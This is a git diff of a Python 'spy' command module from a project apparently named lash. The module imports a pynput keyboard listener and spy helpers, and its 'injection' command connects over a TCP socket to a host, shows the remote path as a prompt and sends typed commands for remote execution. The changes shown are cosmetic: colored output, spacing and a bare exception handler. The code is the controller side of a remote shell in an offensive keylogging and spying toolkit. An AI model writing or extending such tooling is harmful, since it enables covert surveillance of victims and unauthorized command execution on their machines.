@@ -7,6 +7,7 @@ from threading import Thread
 from pynput.keyboard import Listener
 from lash.Exportables.ikeyboard import *
 from lash.Exportables.spyTools import *
+from rich import print
 
 
 @click.group('spy', help='Spy tools')
@@ -112,9 +113,15 @@ def injection(h, c, v):
         port = port_verify(port)
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             s.connect((host, port))
+            print()
             print(injection_client_msg())
+            print()
             while True:
-                path = s.recv(buffer).decode('utf-8')
+                try:
+                    path = s.recv(buffer).decode('utf-8')
+                except:
+                    path = 'undefined'
+                    pass
                 command = str(input(f'{host}\\{path}> ')).strip()
                 if command == '':
                     command = 'snake'
@@ -126,4 +133,4 @@ def injection(h, c, v):
                     s.sendall(bytes(command, 'utf-8'))
                     print(s.recv(buffer).decode('utf-8'))
     else:
-        print('Error: No option passed')
+        print('[red]Error: No option passed[/red]')
